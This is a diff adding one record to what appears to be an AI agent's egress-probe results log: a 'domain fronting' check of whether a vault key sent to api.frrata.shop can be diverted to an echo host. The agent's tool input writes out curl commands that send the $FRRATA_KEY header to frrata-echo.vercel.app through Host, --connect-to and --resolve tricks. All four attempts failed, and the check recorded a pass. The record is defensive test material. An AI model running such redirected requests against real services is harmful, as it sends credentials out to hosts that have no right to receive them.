@@ -2169,6 +2169,59 @@
         }
       ],
       "deleted": true
+    },
+    {
+      "probe": "fronting",
+      "model": "claude-haiku-5-5",
+      "item": "Domain fronting: does the egress send the vault value for api.frrata.shop to another host named by Host, --connect-to or --resolve?",
+      "ran_at": "2026-11-23T07:10:17.844Z",
+      "session_ids": [
+        "sesn_01Qr1oPL9Rqcd5CxX8SFyF6p"
+      ],
+      "list_cost_usd": 0,
+      "status": "answered",
+      "answer": "pass: the vault value never reached frrata-echo.vercel.app (host header, connect-to, resolve, direct tried)",
+      "evidence": {
+        "leaked": [],
+        "echo_ip": "76.76.21.21 (supplied, not resolved)",
+        "output": "host header: 0 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 curl_exit=0 http=403 body_bytes=109\nconnect-to: 0 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 curl_exit=6 http=000 body_bytes=0\necho address: 76.76.21.21 (supplied, not resolved)\nresolve: 0 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 curl_exit=0 http=403 body_bytes=59\ndirect: 0 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 curl_exit=6 http=000 body_bytes=0\n\ncurl: (6) Could not resolve host: frrata-echo.vercel.app\ncurl: (6) Could not resolve host: frrata-echo.vercel.app\n",
+        "toolInputs": [
+          "{\"command\":\"b=$(mktemp); c=$(curl -sS -o \\\"$b\\\" -w '%{http_code}' https://api.frrata.shop/headers -H \\\"Host: frrata-echo.vercel.app\\\" -H \\\"Frrata-Key: $FRRATA_KEY\\\" --max-time 15); x=$?; python3 -c \\\"import sys,json,hashlib;t=open(sys.argv[1]).read();\\ntry:\\n d=json.loads(t);v=d.get('headers',{}).get('frrata-key','')\\nexcept Exception:\\n v=''\\nprint('host header:',len(v),hashlib.sha256(v.encode()).hexdigest(),'curl_exit='+sys.argv[2],'http='+sys.argv[3],'body_bytes='+str(len(t)))\\\" \\\"$b\\\" \\\"$x\\\" \\\"$c\\\"; b=$(mktemp); c=$(curl -sS -o \\\"$b\\\" -w '%{http_code}' -k --connect-to api.frrata.shop:443:frrata-echo.vercel.app:443 https://api.frrata.shop/headers -H \\\"Frrata-Key: $FRRATA_KEY\\\" --max-time 15); x=$?; python3 -c \\\"import sys,json,hashlib;t=open(sys.argv[1]).read();\\ntry:\\n d=json.loads(t);v=d.get('headers',{}).get('frrata-key','')\\nexcept Exception:\\n v=''\\nprint('connect-to:',len(v),hashlib.sha256(v.encode()).hexdigest(),'curl_exit='+sys.argv[2],'http='+sys.argv[3],'body_bytes='+str(len(t)))\\\" \\\"$b\\\" \\\"$x\\\" \\\"$c\\\"; echo \\\"echo address: 76.76.21.21 (supplied, not resolved)\\\"; b=$(mktemp); c=$(curl -sS -o \\\"$b\\\" -w '%{http_code}' -k --resolve api.frrata.shop:443:76.76.21.21 https://api.frrata.shop/headers -H \\\"Frrata-Key: $FRRATA_KEY\\\" --max-time 15); x=$?; python3 -c \\\"import sys,json,hashlib;t=open(sys.argv[1]).read();\\ntry:\\n d=json.loads(t);v=d.get('headers',{}).get('frrata-key','')\\nexcept Exception:\\n v=''\\nprint('resolve:',len(v),hashlib.sha256(v.encode()).hexdigest(),'curl_exit='+sys.argv[2],'http='+sys.argv[3],'body_bytes='+str(len(t)))\\\" \\\"$b\\\" \\\"$x\\\" \\\"$c\\\"; b=$(mktemp); c=$(curl -sS -o \\\"$b\\\" -w '%{http_code}' https://frrata-echo.vercel.app/headers -H \\\"Frrata-Key: $FRRATA_KEY\\\" --max-time 15); x=$?; python3 -c \\\"import sys,json,hashlib;t=open(sys.argv[1]).read();\\ntry:\\n d=json.loads(t);v=d.get('headers',{}).get('frrata-key','')\\nexcept Exception:\\n v=''\\nprint('direct:',len(v),hashlib.sha256(v.encode()).hexdigest(),'curl_exit='+sys.argv[2],'http='+sys.argv[3],'body_bytes='+str(len(t)))\\\" \\\"$b\\\" \\\"$x\\\" \\\"$c\\\"\"}"
+        ],
+        "reply": "```\nhost header: 0 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 curl_exit=0 http=403 body_bytes=109\nconnect-to: 0 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 curl_exit=6 http=000 body_bytes=0\necho address: 76.76.21.21 (supplied, not resolved)\nresolve: 0 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 curl_exit=0 http=403 body_bytes=59\ndirect: 0 e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 curl_exit=6 http=000 body_bytes=0\n```\n\nstderr:\n```\ncurl: (6) Could not resolve host: frrata-echo.vercel.app\ncurl: (6) Could not re",
+        "timeline": [
+          "689ms session.status_running",
+          "694ms session.thread_status_running",
+          "757ms user.message",
+          "759ms span.model_request_start",
+          "3672ms agent.thinking",
+          "6713ms span.model_request_end",
+          "6813ms agent.tool_use",
+          "10999ms agent.tool_result",
+          "11119ms span.model_request_start",
+          "12559ms agent.message",
+          "12561ms span.model_request_end",
+          "12670ms session.thread_status_idle:end_turn",
+          "12672ms session.usage",
+          "12672ms session.status_idle:end_turn"
+        ]
+      },
+      "active_seconds": 12.319,
+      "usage": [
+        {
+          "session": "sesn_01Qr1oPL9Rqcd5CxX8SFyF6p",
+          "input": 6,
+          "output": 2025,
+          "cache_read": 15318,
+          "cache_creation": {
+            "ephemeral_1h_input_tokens": 0,
+            "ephemeral_5m_input_tokens": 3394
+          },
+          "active_seconds": 12.319,
+          "list_cost_usd": 0
+        }
+      ],
+      "deleted": true
     }
   ]
 }
